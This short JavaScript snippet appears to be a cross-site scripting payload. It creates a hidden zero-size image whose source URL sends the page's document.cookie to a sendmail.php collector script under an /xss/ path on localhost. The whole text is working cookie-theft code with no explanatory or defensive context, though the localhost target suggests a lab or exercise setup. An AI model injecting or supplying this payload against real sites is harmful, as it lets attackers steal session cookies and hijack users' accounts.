var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = 'http://localhost/xss/sendmail.php?mycookie='+encodeURIComponent(document.cookie);